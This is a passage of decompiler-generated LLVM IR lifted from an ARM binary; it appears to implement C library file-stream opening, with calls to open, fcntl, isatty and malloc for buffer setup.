  store i32 %v8_1631c, i32* %r2.global-to-local, align 4
  %v2_16328 = add i32 %v0_16308, 8
  %v3_16328 = inttoptr i32 %v2_16328 to i32*
  store i32 0, i32* %v3_16328, align 4
  %v2_16330 = load i32, i32* @r5, align 4
  %v3_16330 = inttoptr i32 %v2_16330 to i16*
  store i16 8192, i16* %v3_16330, align 2
  %v2_16334 = load i32, i32* %r0.global-to-local, align 4
  %v0_16338 = load i32, i32* @r5, align 4
  %v1_16338 = add i32 %v0_16338, 56
  store i32 %v1_16338, i32* @r3, align 4
  %v1_1633c = inttoptr i32 %v1_16338 to i32*
  store i32 %v2_16334, i32* %v1_1633c, align 4
  %v3_1633c = add i32 %v0_16338, 60
  %v4_1633c = inttoptr i32 %v3_1633c to i32*
  %v5_1633c = load i32, i32* @r1, align 4
  store i32 %v5_1633c, i32* %v4_1633c, align 4
  %v6_1633c = add i32 %v0_16338, 64
  %v7_1633c = inttoptr i32 %v6_1633c to i32*
  %v8_1633c = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_1633c, i32* %v7_1633c, align 4
  %v0_16340.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_16340

dec_label_pc_16340:                               ; preds = %.thread3, %dec_label_pc_16314
  %v0_16398 = phi i32 [ %v0_16284, %.thread3 ], [ %v0_16340.pre, %dec_label_pc_16314 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_16340 = icmp slt i32 %v0_16398, 0
  br i1 %v1_16340, label %dec_label_pc_16398, label %dec_label_pc_16348

dec_label_pc_16348:                               ; preds = %dec_label_pc_16340
  %v0_1634c = load i32, i32* @r4, align 4
  %v2_1634c = and i32 %v0_1634c, 131075
  %v1_16350 = add nuw nsw i32 %v2_1634c, 1
  store i32 %v1_16350, i32* %r2.global-to-local, align 4
  %v0_16354 = load i32, i32* @r7, align 4
  %v1_16354 = add i32 %v0_16354, 1
  %v2_16358 = and i32 %v1_16354, %v1_16350
  store i32 %v2_16358, i32* %r3.global-to-local, align 4
  %v3_1635c = icmp uge i32 %v2_16358, %v1_16350
  store i1 %v3_1635c, i1* %cpsr_c.global-to-local, align 1
  %v9_1635c = icmp eq i32 %v2_16358, %v1_16350
  %v1_16360 = load i32, i32* @r5, align 4
  %v2_16360 = add i32 %v1_16360, 4
  %v3_16360 = inttoptr i32 %v2_16360 to i32*
  store i32 %v0_16398, i32* %v3_16360, align 4
  br i1 %v9_1635c, label %dec_label_pc_16368, label %dec_label_pc_162a4

dec_label_pc_16368:                               ; preds = %dec_label_pc_16348
  %v0_16368 = load i32, i32* @r4, align 4
  %v1_16368 = load i32, i32* @r7, align 4
  %v2_16368 = sub i32 -1, %v1_16368
  %v3_16368 = and i32 %v0_16368, %v2_16368
  store i32 %v3_16368, i32* @r3, align 4
  %v1_1636c = and i32 %v3_16368, 1024
  %v2_1636c = icmp eq i32 %v1_1636c, 0
  br i1 %v2_1636c, label %dec_label_pc_1638c, label %dec_label_pc_16374

dec_label_pc_16374:                               ; preds = %dec_label_pc_16368
  %v0_16374 = load i32, i32* @r6, align 4
  store i32 %v0_16374, i32* %r0.global-to-local, align 4
  store i32 1024, i32* @r2, align 4
  %v2_16380 = call i32 @__libc_fcntl(i32 %v0_16374, i32 4)
  store i32 %v2_16380, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16384 = icmp eq i32 %v2_16380, 0
  br i1 %v2_16384, label %dec_label_pc_16374.dec_label_pc_1638c_crit_edge, label %dec_label_pc_162a4

dec_label_pc_16374.dec_label_pc_1638c_crit_edge:  ; preds = %dec_label_pc_16374
  %v0_1638c.pre = load i32, i32* @r7, align 4
  %v0_16390.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1638c

dec_label_pc_1638c:                               ; preds = %dec_label_pc_16374.dec_label_pc_1638c_crit_edge, %dec_label_pc_16368
  %v0_16390 = phi i32 [ %v0_16390.pre, %dec_label_pc_16374.dec_label_pc_1638c_crit_edge ], [ %v0_16368, %dec_label_pc_16368 ]
  %v0_1638c = phi i32 [ %v0_1638c.pre, %dec_label_pc_16374.dec_label_pc_1638c_crit_edge ], [ %v1_16368, %dec_label_pc_16368 ]
  %v1_1638c = and i32 %v0_1638c, 131072
  store i32 %v1_1638c, i32* %r3.global-to-local, align 4
  %v2_16390 = or i32 %v1_1638c, %v0_16390
  store i32 %v2_16390, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_163bc

dec_label_pc_16398:                               ; preds = %dec_label_pc_16340
  %v2_16398 = icmp eq i32 %v0_16398, -1
  store i1 %v2_16398, i1* %cpsr_c.global-to-local, align 1
  %v7_16398 = icmp eq i32 %v0_16398, -1
  %v0_163a4.pre = load i32, i32* @r4, align 4
  br i1 %v7_16398, label %dec_label_pc_16398._crit_edge, label %bb53

bb53:                                             ; preds = %dec_label_pc_16398
  %v2_1639c = or i32 %v0_163a4.pre, 131072
  store i32 %v2_1639c, i32* @r4, align 4
  br label %dec_label_pc_16398._crit_edge

dec_label_pc_16398._crit_edge:                    ; preds = %dec_label_pc_16398, %bb53
  %v0_163a4 = phi i32 [ %v2_1639c, %bb53 ], [ %v0_163a4.pre, %dec_label_pc_16398 ]
  %v0_163a0 = load i32, i32* @r7, align 4
  store i32 %v0_163a0, i32* %r0.global-to-local, align 4
  store i32 438, i32* @r2, align 4
  %v2_163ac = call i32 @__libc_open(i32 %v0_163a0, i32 %v0_163a4)
  store i32 %v2_163ac, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_163b0 = icmp slt i32 %v2_163ac, 0
  %v1_163b4 = load i32, i32* @r5, align 4
  %v2_163b4 = add i32 %v1_163b4, 4
  %v3_163b4 = inttoptr i32 %v2_163b4 to i32*
  store i32 %v2_163ac, i32* %v3_163b4, align 4
  br i1 %v1_163b0, label %dec_label_pc_162c0, label %.dec_label_pc_163bc_crit_edge

.dec_label_pc_163bc_crit_edge:                    ; preds = %dec_label_pc_16398._crit_edge
  %v0_163c0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_163bc

dec_label_pc_163bc:                               ; preds = %.dec_label_pc_163bc_crit_edge, %dec_label_pc_1638c
  %v0_163d8 = phi i32 [ %v0_163c0.pre, %.dec_label_pc_163bc_crit_edge ], [ %v2_16390, %dec_label_pc_1638c ]
  %v0_163bc = load i32, i32* @r5, align 4
  %v1_163bc = inttoptr i32 %v0_163bc to i16*
  %v2_163bc = load i16, i16* %v1_163bc, align 2
  %v3_163bc = zext i16 %v2_163bc to i32
  %v1_163c0 = urem i32 %v0_163d8, 4
  %v1_163c4 = and i32 %v0_163d8, 1024
  %v1_163c8 = and i32 %v3_163bc, 8192
  %v1_163cc = add nuw nsw i32 %v1_163c0, 1
  %v2_163d0 = or i32 %v1_163c8, %v1_163c4
  store i32 %v2_163d0, i32* %r3.global-to-local, align 4
  %v1_163d4 = xor i32 %v1_163cc, 3
  %v1_163d8 = and i32 %v0_163d8, 131072
  store i32 %v1_163d8, i32* %r2.global-to-local, align 4
  %v2_163d8 = icmp eq i32 %v1_163d8, 0
  %v1_163dc = add i32 %v0_163bc, 4
  %v2_163dc = inttoptr i32 %v1_163dc to i32*
  %v3_163dc = load i32, i32* %v2_163dc, align 4
  store i32 %v3_163dc, i32* @r4, align 4
  br i1 %v2_163d8, label %bb55, label %bb54

bb54:                                             ; preds = %dec_label_pc_163bc
  store i32 32768, i32* %r2.global-to-local, align 4
  br label %bb55

bb55:                                             ; preds = %dec_label_pc_163bc, %bb54
  %v0_163e8 = phi i32 [ 0, %dec_label_pc_163bc ], [ 32768, %bb54 ]
  %v4_163e4 = mul nuw nsw i32 %v1_163d4, 16
  %v5_163e4 = or i32 %v2_163d0, %v4_163e4
  store i32 %v5_163e4, i32* %r3.global-to-local, align 4
  %v2_163e8 = or i32 %v0_163e8, %v5_163e4
  store i32 %v2_163e8, i32* %r2.global-to-local, align 4
  %v2_163ec = icmp ugt i32 %v3_163dc, 2147483646
  store i1 %v2_163ec, i1* %cpsr_c.global-to-local, align 1
  %v8_163ec = icmp eq i32 %v3_163dc, 2147483647
  %v1_163f0 = trunc i32 %v2_163e8 to i16
  store i16 %v1_163f0, i16* %v1_163bc, align 2
  br i1 %v8_163ec, label %dec_label_pc_16430, label %dec_label_pc_163f8

dec_label_pc_163f8:                               ; preds = %bb55
  store i32 48724, i32* %r3.global-to-local, align 4
  %v0_163fc = call i32 @__aeabi_read_tp()
  %v3_16400 = load i16, i16* @global_var_2225c.361, align 2
  %v4_16400 = sext i16 %v3_16400 to i32
  store i32 %v4_16400, i32* @r3, align 4
  store i32 %v0_163fc, i32* @r6, align 4
  %v0_16408 = load i32, i32* @r4, align 4
  store i32 %v0_16408, i32* @r0, align 4
  %v2_1640c = add i32 %v4_16400, %v0_163fc
  %v3_1640c = inttoptr i32 %v2_1640c to i32*
  %v4_1640c = load i32, i32* %v3_1640c, align 4
  store i32 %v4_1640c, i32* @r4, align 4
  %v1_16410 = call i32 @isatty(i32 %v0_16408)
  store i32 %v1_16410, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16414 = icmp eq i32 %v1_16410, 0
  br i1 %v2_16414, label %.thread5, label %bb56

bb56:                                             ; preds = %dec_label_pc_163f8
  %v1_16418 = load i32, i32* @r5, align 4
  %v2_16418 = inttoptr i32 %v1_16418 to i16*
  %v3_16418 = load i16, i16* %v2_16418, align 2
  %v4_16418 = zext i16 %v3_16418 to i32
  %v2_1641c = or i32 %v4_16418, 256
  store i32 %v2_1641c, i32* %r3.global-to-local, align 4
  %v2_16420 = trunc i32 %v2_1641c to i16
  store i16 %v2_16420, i16* %v2_16418, align 2
  br label %.thread5

.thread5:                                         ; preds = %dec_label_pc_163f8, %bb56
  %v3_16428 = load i16, i16* @global_var_2225c.361, align 2
  %v4_16428 = sext i16 %v3_16428 to i32
  store i32 %v4_16428, i32* %r3.global-to-local, align 4
  %v0_1642c = load i32, i32* @r4, align 4
  %v1_1642c = load i32, i32* @r6, align 4
  %v3_1642c = add i32 %v1_1642c, %v4_16428
  %v4_1642c = inttoptr i32 %v3_1642c to i32*
  store i32 %v0_1642c, i32* %v4_1642c, align 4
  br label %dec_label_pc_16430

dec_label_pc_16430:                               ; preds = %bb55, %.thread5
  %v0_16430 = load i32, i32* @r5, align 4
  %v1_16430 = add i32 %v0_16430, 8
  %v2_16430 = inttoptr i32 %v1_16430 to i32*
  %v3_16430 = load i32, i32* %v2_16430, align 4
  store i32 %v3_16430, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16434 = icmp eq i32 %v3_16430, 0
  br i1 %v2_16434, label %dec_label_pc_1643c, label %bb57

dec_label_pc_1643c:                               ; preds = %dec_label_pc_16430
  store i32 4096, i32* @r0, align 4
  %v0_16440 = call i32 @malloc()
  store i32 %v0_16440, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16444 = icmp eq i32 %v0_16440, 0
  %v1_16454.pre = load i32, i32* @r5, align 4
  br i1 %v2_16444, label %.thread9, label %.thread8

.thread8:                                         ; preds = %dec_label_pc_1643c
  %v2_16448 = inttoptr i32 %v1_16454.pre to i16*
  %v3_16448 = load i16, i16* %v2_16448, align 2
  %v4_16448 = zext i16 %v3_16448 to i32
  %v2_1644c = add i32 %v0_16440, 4096
  store i32 %v2_1644c, i32* %r2.global-to-local, align 4
  %v2_16450 = or i32 %v4_16448, 16384
  store i32 %v2_16450, i32* %r3.global-to-local, align 4
  %v2_16454 = add i32 %v1_16454.pre, 8
  %v3_16454 = inttoptr i32 %v2_16454 to i32*
  store i32 %v0_16440, i32* %v3_16454, align 4
  %v1_16458 = load i32, i32* %r2.global-to-local, align 4
  %v2_16458 = load i32, i32* @r5, align 4
  %v3_16458 = add i32 %v2_16458, 12
  %v4_16458 = inttoptr i32 %v3_16458 to i32*
  store i32 %v1_16458, i32* %v4_16458, align 4
  %v1_1645c = load i32, i32* %r3.global-to-local, align 4
  %v2_1645c = trunc i32 %v1_1645c to i16
  %v3_1645c = load i32, i32* @r5, align 4
  %v4_1645c = inttoptr i32 %v3_1645c to i16*
  store i16 %v2_1645c, i16* %v4_1645c, align 2
  br label %bb57

.thread9:                                         ; preds = %dec_label_pc_1643c
  %v2_1645437 = add i32 %v1_16454.pre, 8
  %v3_1645438 = inttoptr i32 %v2_1645437 to i32*
  store i32 0, i32* %v3_1645438, align 4
  %v2_16460 = load i32, i32* @r5, align 4
  %v3_16460 = add i32 %v2_16460, 12
  %v4_16460 = inttoptr i32 %v3_16460 to i32*
  store i32 0, i32* %v4_16460, align 4
  br label %bb57

bb57:                                             ; preds = %.thread8, %dec_label_pc_16430, %.thread9
  store i32 92, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v0_1646c = load i32, i32* @r8, align 4
  %v2_1646c = add i32 %v0_1646c, 92
  %v3_1646c = inttoptr i32 %v2_1646c to i32*
  %v4_1646c = load i32, i32* %v3_1646c, align 4
  store i32 %v4_1646c, i32* %r3.global-to-local, align 4
  %v2_16470 = load i32, i32* @r5, align 4
  %v3_16470 = add i32 %v2_16470, 2
  %v4_16470 = inttoptr i32 %v3_16470 to i8*
  store i8 0, i8* %v4_16470, align 1
  %v0_16474 = load i32, i32* @r5, align 4
  %v1_16474 = inttoptr i32 %v0_16474 to i16*
  %v2_16474 = load i16, i16* %v1_16474, align 2
  %v3_16474 = zext i16 %v2_16474 to i32
  store i32 %v3_16474, i32* %r2.global-to-local, align 4
  %v0_16478 = load i32, i32* %r3.global-to-local, align 4
  %v1_16478 = inttoptr i32 %v0_16478 to i32*
  %v2_16478 = load i32, i32* %v1_16478, align 4
  store i32 %v2_16478, i32* @r1, align 4
  %v1_1647c = add i32 %v0_16474, 8
  %v2_1647c = inttoptr i32 %v1_1647c to i32*
  %v3_1647c = load i32, i32* %v2_1647c, align 4
  store i32 %v3_1647c, i32* %r3.global-to-local, align 4
  %v1_16480 = and i32 %v3_16474, 8192
  %v2_16480 = icmp eq i32 %v1_16480, 0
  %v2_16484 = add i32 %v0_16474, 20
  %v3_16484 = inttoptr i32 %v2_16484 to i32*
  store i32 %v3_1647c, i32* %v3_16484, align 4
  %v0_16488 = load i32, i32* @r1, align 4
  %v1_16488 = load i32, i32* @r5, align 4
  %v2_16488 = add i32 %v1_16488, 52
  %v3_16488 = inttoptr i32 %v2_16488 to i32*
  store i32 %v0_16488, i32* %v3_16488, align 4
  %v0_1648c = load i32, i32* %r3.global-to-local, align 4
  %v1_1648c = load i32, i32* @r5, align 4
  %v2_1648c = add i32 %v1_1648c, 24
  %v3_1648c = inttoptr i32 %v2_1648c to i32*
  store i32 %v0_1648c, i32* %v3_1648c, align 4
  %v0_16490 = load i32, i32* %r3.global-to-local, align 4
  %v1_16490 = load i32, i32* @r5, align 4
  %v2_16490 = add i32 %v1_16490, 28
  %v3_16490 = inttoptr i32 %v2_16490 to i32*
  store i32 %v0_16490, i32* %v3_16490, align 4
  %v0_16494 = load i32, i32* %r3.global-to-local, align 4
  %v1_16494 = load i32, i32* @r5, align 4
  %v2_16494 = add i32 %v1_16494, 16
  %v3_16494 = inttoptr i32 %v2_16494 to i32*
  store i32 %v0_16494, i32* %v3_16494, align 4
  %v0_16498 = load i32, i32* %r4.global-to-local, align 4
  %v1_16498 = load i32, i32* @r5, align 4
  %v2_16498 = add i32 %v1_16498, 44
  %v3_16498 = inttoptr i32 %v2_16498 to i32*
  store i32 %v0_16498, i32* %v3_16498, align 4
  br i1 %v2_16480, label %dec_label_pc_16680, label %dec_label_pc_164a0

dec_label_pc_164a0:                               ; preds = %bb57
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_164a4 = load i32, i32* @r8, align 4
  %v2_164a4 = add i32 %v0_164a4, 160
  %v3_164a4 = inttoptr i32 %v2_164a4 to i32*
  %v4_164a4 = load i32, i32* %v3_164a4, align 4
  store i32 %v4_164a4, i32* %r7.global-to-local, align 4
  %v0_164a8 = call i32 @__aeabi_read_tp()
  store i32 %v0_164a8, i32* %r0.global-to-local, align 4
  %v1_164ac = add i32 %v4_164a4, 8
  %v2_164ac = inttoptr i32 %v1_164ac to i32*
  %v3_164ac = load i32, i32* %v2_164ac, align 4
  store i32 %v3_164ac, i32* %r3.global-to-local, align 4
  %v1_164b0 = add i32 %v0_164a8, -1168
  store i32 %v1_164b0, i32* %r6.global-to-local, align 4
  %v3_164b4 = icmp uge i32 %v3_164ac, %v1_164b0
  store i1 %v3_164b4, i1* %cpsr_c.global-to-local, align 1
  %v9_164b4 = icmp eq i32 %v3_164ac, %v1_164b0
  br i1 %v9_164b4, label %dec_label_pc_164f8, label %dec_label_pc_164bc

dec_label_pc_164bc:                               ; preds = %dec_label_pc_164a0
  store i32 %v4_164a4, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_164c4

dec_label_pc_164c4:                               ; preds = %dec_label_pc_164d0.dec_label_pc_164c4_crit_edge, %dec_label_pc_164bc
  %v0_164c4 = phi i32 [ %v0_164c4.pre, %dec_label_pc_164d0.dec_label_pc_164c4_crit_edge ], [ %v4_164a4, %dec_label_pc_164bc ]
  %v1_164c4 = inttoptr i32 %v0_164c4 to i32*
  %v2_164c4 = load i32, i32* %v1_164c4, align 4
  store i32 %v2_164c4, i32* %r3.global-to-local, align 4
  %v1_164c8 = load i32, i32* %r4.global-to-local, align 4
  %v3_164c8 = icmp uge i32 %v2_164c4, %v1_164c8
  store i1 %v3_164c8, i1* %cpsr_c.global-to-local, align 1
  %v9_164c8 = icmp eq i32 %v2_164c4, %v1_164c8
  br i1 %v9_164c8, label %dec_label_pc_164d0, label %dec_label_pc_164e8

dec_label_pc_164d0:                               ; preds = %dec_label_pc_164c4
  store i32 %v2_164c4, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_164e0 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_164e0, label %dec_label_pc_164e4, label %dec_label_pc_164d0.dec_label_pc_164c4_crit_edge

dec_label_pc_164d0.dec_label_pc_164c4_crit_edge:  ; preds = %dec_label_pc_164d0
  %v0_164c4.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_164c4

dec_label_pc_164e4:                               ; preds = %dec_label_pc_164d0
  %v0_164e4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_164e4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_164e8

dec_label_pc_164e8:                               ; preds = %dec_label_pc_164c4, %dec_label_pc_164e4
  %v0_164e8 = phi i32 [ %v0_164e4, %dec_label_pc_164e4 ], [ %v2_164c4, %dec_label_pc_164c4 ]
  %v1_164e8 = phi i32 [ %v0_164e4, %dec_label_pc_164e4 ], [ %v1_164c8, %dec_label_pc_164c4 ]
  %v3_164e8 = icmp uge i32 %v0_164e8, %v1_164e8
  store i1 %v3_164e8, i1* %cpsr_c.global-to-local, align 1
  %v9_164e8 = icmp eq i32 %v0_164e8, %v1_164e8
  br i1 %v9_164e8, label %bb59, label %bb58

bb58:                                             ; preds = %dec_label_pc_164e8
  %v1_164ec = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_164ec, i32* %r0.global-to-local, align 4
  br label %bb59

bb59:                                             ; preds = %dec_label_pc_164e8, %bb58
  %v1_164f0 = xor i1 %v9_164e8, true
  call void @__pseudo_cond_branch(i1 %v1_164f0, i32 ptrtoint (i32* @global_var_14744.525 to i32))
  %v0_164f4 = load i32, i32* %r6.global-to-local, align 4
  %v1_164f4 = load i32, i32* %r7.global-to-local, align 4
  %v2_164f4 = add i32 %v1_164f4, 8
  %v3_164f4 = inttoptr i32 %v2_164f4 to i32*
  store i32 %v0_164f4, i32* %v3_164f4, align 4
  %v1_16514.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_164f8

dec_label_pc_164f8:                               ; preds = %dec_label_pc_164a0, %bb59
  %v1_16514 = phi i32 [ %v3_164ac, %dec_label_pc_164a0 ], [ %v1_16514.pre, %bb59 ]
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_164fc = load i32, i32* @r8, align 4
  %v2_164fc = add i32 %v0_164fc, 160
  %v3_164fc = inttoptr i32 %v2_164fc to i32*
  %v4_164fc = load i32, i32* %v3_164fc, align 4
  store i32 152, i32* %r3.global-to-local, align 4
  %v2_16504 = add i32 %v0_164fc, 152
  %v3_16504 = inttoptr i32 %v2_16504 to i32*
  %v4_16504 = load i32, i32* %v3_16504, align 4
  store i32 %v4_16504, i32* %r7.global-to-local, align 4
  %v1_16508 = add i32 %v4_164fc, 4
  %v2_16508 = inttoptr i32 %v1_16508 to i32*
  %v3_16508 = load i32, i32* %v2_16508, align 4
  store i32 %v3_16508, i32* %r3.global-to-local, align 4
  %v1_1650c = add i32 %v4_16504, 8
  %v2_1650c = inttoptr i32 %v1_1650c to i32*
  %v3_1650c = load i32, i32* %v2_1650c, align 4
  store i32 %v3_1650c, i32* %r2.global-to-local, align 4
  %v1_16510 = add i32 %v3_16508, 1
  store i32 %v1_16510, i32* %r3.global-to-local, align 4
  %v3_16514 = icmp uge i32 %v3_1650c, %v1_16514
  store i1 %v3_16514, i1* %cpsr_c.global-to-local, align 1
  %v9_16514 = icmp eq i32 %v3_1650c, %v1_16514
  store i32 %v1_16510, i32* %v2_16508, align 4
  br i1 %v9_16514, label %dec_label_pc_16560, label %dec_label_pc_16520

dec_label_pc_16520:                               ; preds = %dec_label_pc_164f8
  %v0_16524 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_16524, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_1652c95 = inttoptr i32 %v0_16524 to i32*
  %v2_1652c96 = load i32, i32* %v1_1652c95, align 4
  store i32 %v2_1652c96, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_1653098 = icmp eq i32 %v2_1652c96, 0
  br i1 %v9_1653098, label %dec_label_pc_16538, label %dec_label_pc_16550

dec_label_pc_16538:                               ; preds = %dec_label_pc_16520, %dec_label_pc_16538.dec_label_pc_1652c_crit_edge
  %v0_1653899 = phi i32 [ %v1_16530.pre, %dec_label_pc_16538.dec_label_pc_1652c_crit_edge ], [ 0, %dec_label_pc_16520 ]
  store i32 %v0_1653899, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_16548 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_16548, label %dec_label_pc_1654c, label %dec_label_pc_16538.dec_label_pc_1652c_crit_edge

dec_label_pc_16538.dec_label_pc_1652c_crit_edge:  ; preds = %dec_label_pc_16538
  %v0_1652c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_16530.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_1652c = inttoptr i32 %v0_1652c.pre to i32*
  %v2_1652c = load i32, i32* %v1_1652c, align 4
  store i32 %v2_1652c, i32* %r3.global-to-local, align 4
  %v3_16530 = icmp uge i32 %v2_1652c, %v1_16530.pre
  store i1 %v3_16530, i1* %cpsr_c.global-to-local, align 1
  %v9_16530 = icmp eq i32 %v2_1652c, %v1_16530.pre
  br i1 %v9_16530, label %dec_label_pc_16538, label %dec_label_pc_16550

dec_label_pc_1654c:                               ; preds = %dec_label_pc_16538
  %v0_1654c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_1654c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16550

dec_label_pc_16550:                               ; preds = %dec_label_pc_16520, %dec_label_pc_16538.dec_label_pc_1652c_crit_edge, %dec_label_pc_1654c
  %v0_16550 = phi i32 [ %v0_1654c, %dec_label_pc_1654c ], [ %v2_1652c96, %dec_label_pc_16520 ], [ %v2_1652c, %dec_label_pc_16538.dec_label_pc_1652c_crit_edge ]
  %v1_16550 = phi i32 [ %v0_1654c, %dec_label_pc_1654c ], [ 0, %dec_label_pc_16520 ], [ %v1_16530.pre, %dec_label_pc_16538.dec_label_pc_1652c_crit_edge ]
  %v3_16550 = icmp uge i32 %v0_16550, %v1_16550
  store i1 %v3_16550, i1* %cpsr_c.global-to-local, align 1
  %v9_16550 = icmp eq i32 %v0_16550, %v1_16550
  br i1 %v9_16550, label %bb61, label %bb60

bb60:                                             ; preds = %dec_label_pc_16550
  %v1_16554 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_16554, i32* %r0.global-to-local, align 4
  br label %bb61

bb61:                                             ; preds = %dec_label_pc_16550, %bb60
  %v1_16558 = xor i1 %v9_16550, true
  call void @__pseudo_cond_branch(i1 %v1_16558, i32 ptrtoint (i32* @global_var_14744.525 to i32))
  %v0_1655c = load i32, i32* %r6.global-to-local, align 4
  %v1_1655c = load i32, i32* %r7.global-to-local, align 4
  %v2_1655c = add i32 %v1_1655c, 8
  %v3_1655c = inttoptr i32 %v2_1655c to i32*
  store i32 %v0_1655c, i32* %v3_1655c, align 4
  br label %dec_label_pc_16560

dec_label_pc_16560:                               ; preds = %dec_label_pc_164f8, %bb61
  store i32 152, i32* %r3.global-to-local, align 4
  %v0_16564 = load i32, i32* @r8, align 4
  %v2_16564 = add i32 %v0_16564, 152
  %v3_16564 = inttoptr i32 %v2_16564 to i32*
  %v4_16564 = load i32, i32* %v3_16564, align 4
  store i32 %v4_16564, i32* %r0.global-to-local, align 4
  store i32 76, i32* %r3.global-to-local, align 4
  %v2_1656c = add i32 %v0_16564, 76
  %v3_1656c = inttoptr i32 %v2_1656c to i32*
  %v4_1656c = load i32, i32* %v3_1656c, align 4
  store i32 %v4_1656c, i32* @r1, align 4
  %v1_16570 = add i32 %v4_16564, 4
  %v2_16570 = inttoptr i32 %v1_16570 to i32*
  %v3_16570 = load i32, i32* %v2_16570, align 4
  store i32 %v3_16570, i32* %r3.global-to-local, align 4
  %v1_16574 = inttoptr i32 %v4_1656c to i32*
  %v2_16574 = load i32, i32* %v1_16574, align 4
  store i32 %v2_16574, i32* %r2.global-to-local, align 4
  %v1_16578 = add i32 %v3_16570, 1
  store i32 %v1_16578, i32* %r3.global-to-local, align 4
  store i32 %v1_16578, i32* %v2_16570, align 4
  %v0_16580 = load i32, i32* %r2.global-to-local, align 4
  %v1_16580 = load i32, i32* @r5, align 4
  %v2_16580 = add i32 %v1_16580, 32
  %v3_16580 = inttoptr i32 %v2_16580 to i32*
  store i32 %v0_16580, i32* %v3_16580, align 4
  %v0_16584 = load i32, i32* %r0.global-to-local, align 4
  %v1_16584 = add i32 %v0_16584, 4
  %v2_16584 = inttoptr i32 %v1_16584 to i32*
  %v3_16584 = load i32, i32* %v2_16584, align 4
  %v1_16588 = add i32 %v3_16584, -1
  store i32 %v1_16588, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1658c = icmp eq i32 %v1_16588, 0
  %v0_16590 = load i32, i32* @r5, align 4
  %v1_16590 = load i32, i32* @r1, align 4
  %v2_16590 = inttoptr i32 %v1_16590 to i32*
  store i32 %v0_16590, i32* %v2_16590, align 4
  %v0_16594 = load i32, i32* %r3.global-to-local, align 4
  %v1_16594 = load i32, i32* %r0.global-to-local, align 4
  %v2_16594 = add i32 %v1_16594, 4
  %v3_16594 = inttoptr i32 %v2_16594 to i32*
  store i32 %v0_16594, i32* %v3_16594, align 4
  br i1 %v2_1658c, label %dec_label_pc_1659c, label %dec_label_pc_165fc

dec_label_pc_1659c:                               ; preds = %dec_label_pc_16560
  %v0_1659c = load i32, i32* %r3.global-to-local, align 4
  %v1_1659c = load i32, i32* %r0.global-to-local, align 4
  %v2_1659c = add i32 %v1_1659c, 8
  %v3_1659c = inttoptr i32 %v2_1659c to i32*
  store i32 %v0_1659c, i32* %v3_1659c, align 4
  %v0_165a0 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_165a0, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_165a4

dec_label_pc_165a4:                               ; preds = %dec_label_pc_165d4.dec_label_pc_165a4_crit_edge, %dec_label_pc_1659c
  %v0_165a4 = phi i32 [ %v0_165a4.pre, %dec_label_pc_165d4.dec_label_pc_165a4_crit_edge ], [ %v0_165a0, %dec_label_pc_1659c ]
  %v1_165a4 = inttoptr i32 %v0_165a4 to i32*
  %v2_165a4 = load i32, i32* %v1_165a4, align 4
  store i32 %v2_165a4, i32* %r4.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 %v0_165a4, i32* %r2.global-to-local, align 4
  %v2_165b083 = load i32, i32* %v1_165a4, align 4
  store i32 %v2_165b083, i32* %r3.global-to-local, align 4
  %v3_165b485 = icmp uge i32 %v2_165b083, %v2_165a4
  store i1 %v3_165b485, i1* %cpsr_c.global-to-local, align 1
  %v9_165b491 = icmp eq i32 %v2_165b083, %v2_165a4
  br i1 %v9_165b491, label %dec_label_pc_165bc, label %dec_label_pc_165d4

dec_label_pc_165bc:                               ; preds = %dec_label_pc_165a4, %dec_label_pc_165bc.dec_label_pc_165b0_crit_edge
  %v0_165bc92 = phi i32 [ %v1_165b4.pre, %dec_label_pc_165bc.dec_label_pc_165b0_crit_edge ], [ %v2_165a4, %dec_label_pc_165a4 ]
  store i32 %v0_165bc92, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_165cc = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_165cc, label %dec_label_pc_165d0, label %dec_label_pc_165bc.dec_label_pc_165b0_crit_edge

dec_label_pc_165bc.dec_label_pc_165b0_crit_edge:  ; preds = %dec_label_pc_165bc
